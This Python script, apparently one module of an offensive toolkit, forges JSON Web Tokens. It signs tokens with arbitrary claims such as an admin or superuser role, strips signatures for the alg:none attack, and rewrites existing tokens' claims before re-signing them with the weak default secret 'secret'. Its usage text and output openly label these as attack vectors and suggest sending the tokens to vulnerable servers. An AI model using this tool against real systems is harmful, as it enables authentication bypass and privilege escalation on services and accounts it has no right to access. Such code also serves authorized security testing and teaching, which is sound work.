"""JWT Forge — Module 113. Create/sign JWTs with custom claims and algorithms."""
import sys, json, base64, hmac, hashlib, time

def b64url_encode(data):
    if isinstance(data, str): data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def b64url_decode(s):
    s += '=' * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)

def sign_hs(header_b64, payload_b64, secret, alg):
    msg = f"{header_b64}.{payload_b64}".encode()
    h = hashlib.sha256 if alg == 'HS256' else (hashlib.sha384 if alg == 'HS384' else hashlib.sha512)
    sig = hmac.new(secret.encode(), msg, h).digest()
    return b64url_encode(sig)

def forge_none(header_b64, payload_b64):
    h = json.loads(b64url_decode(header_b64))
    h['alg'] = 'none'
    new_h = b64url_encode(json.dumps(h, separators=(',',':')))
    return f"{new_h}.{payload_b64}."

def main():
    print("[MODULE 113] JWT FORGE")
    print("[SOURCE]     Local HMAC-SHA computation — no external calls")
    print()
    raw = (sys.argv[1].strip() if len(sys.argv) > 1 else "").strip()
    if not raw:
        print("[USAGE]  sign:SECRET:PAYLOAD_JSON          — sign with HS256")
        print("         sign:HS512:SECRET:PAYLOAD_JSON    — sign with HS512")
        print("         none:EXISTING_JWT                 — strip signature (alg:none attack)")
        print("         forge:EXISTING_JWT:NEW_CLAIMS_JSON — modify claims + re-sign with 'secret'")
        print()
        print("[EXAMPLE] sign:mysecret:{\"sub\":\"admin\",\"role\":\"superuser\"}")
        print("[EXAMPLE] none:eyJhbGci...")
        sys.exit(0)

    now = int(time.time())

    if raw.startswith("sign:"):
        parts = raw[5:].split(":", 2)
        if len(parts) == 2:
            secret, payload_raw = parts
            alg = "HS256"
        elif len(parts) == 3:
            alg, secret, payload_raw = parts
            if alg not in ("HS256","HS384","HS512"):
                print(f"[ERROR] Unsupported alg: {alg}"); sys.exit(1)
        else:
            print("[ERROR] format: sign:SECRET:JSON"); sys.exit(1)
        try:
            payload = json.loads(payload_raw)
        except:
            print("[ERROR] Invalid JSON payload"); sys.exit(1)
        if "iat" not in payload: payload["iat"] = now
        if "exp" not in payload: payload["exp"] = now + 3600
        header = {"alg": alg, "typ": "JWT"}
        h_b64 = b64url_encode(json.dumps(header, separators=(',',':')))
        p_b64 = b64url_encode(json.dumps(payload, separators=(',',':')))
        sig = sign_hs(h_b64, p_b64, secret, alg)
        token = f"{h_b64}.{p_b64}.{sig}"
        print(f"[ALGORITHM]   {alg}")
        print(f"[SECRET]      {secret}")
        print(f"[HEADER]      {json.dumps(header)}")
        print(f"[PAYLOAD]     {json.dumps(payload, indent=2)}")
        print()
        print(f"[TOKEN]       {token}")
        print()
        print(f"[HEADER_B64]  {h_b64}")
        print(f"[PAYLOAD_B64] {p_b64}")
        print(f"[SIGNATURE]   {sig}")
        print()
        print("[ATTACK VECTOR] alg:none — strip signature, set alg to 'none'")
        print("[ATTACK VECTOR] HMAC secret brute-force with weak/default secrets")

    elif raw.startswith("none:"):
        token = raw[5:].strip()
        parts = token.split(".")
        if len(parts) < 2:
            print("[ERROR] Not a valid JWT"); sys.exit(1)
        forged = forge_none(parts[0], parts[1])
        print(f"[ORIGINAL]    {token}")
        print()
        try:
            h = json.loads(b64url_decode(parts[0]))
            p = json.loads(b64url_decode(parts[1]))
            print(f"[ORIG ALG]    {h.get('alg','?')}")
            print(f"[CLAIMS]      {json.dumps(p, indent=2)}")
        except: pass
        print()
        print(f"[FORGED]      {forged}")
        print()
        print("[INFO] Signature stripped — send to servers that accept alg:none")
        print("[INFO] Vulnerable servers skip signature verification when alg=none")

    elif raw.startswith("forge:"):
        rest = raw[6:]
        idx = rest.rfind(":{")
        if idx == -1:
            print("[ERROR] format: forge:JWT:NEW_CLAIMS_JSON"); sys.exit(1)
        token = rest[:idx]
        new_claims_raw = rest[idx+1:]
        parts = token.split(".")
        if len(parts) < 2:
            print("[ERROR] Not a valid JWT"); sys.exit(1)
        try:
            new_claims = json.loads(new_claims_raw)
            original = json.loads(b64url_decode(parts[1]))
        except Exception as e:
            print(f"[ERROR] {e}"); sys.exit(1)
        original.update(new_claims)
        original["iat"] = now
        original["exp"] = now + 3600
        h_b64 = parts[0]
        p_b64 = b64url_encode(json.dumps(original, separators=(',',':')))
        sig = sign_hs(h_b64, p_b64, "secret", "HS256")
        forged = f"{h_b64}.{p_b64}.{sig}"
        print(f"[MODIFIED CLAIMS]  {json.dumps(original, indent=2)}")
        print()
        print(f"[FORGED TOKEN]     {forged}")
        print()
        print("[INFO] Re-signed with secret='secret' (common weak default)")
        print("[INFO] Also try alg:none variant for servers that skip verification")
    else:
        print(f"[ERROR] Unknown command. Use sign:, none:, or forge:")

    print()
    print("[DONE] JWT forge complete.")

if __name__ == "__main__":
    main()
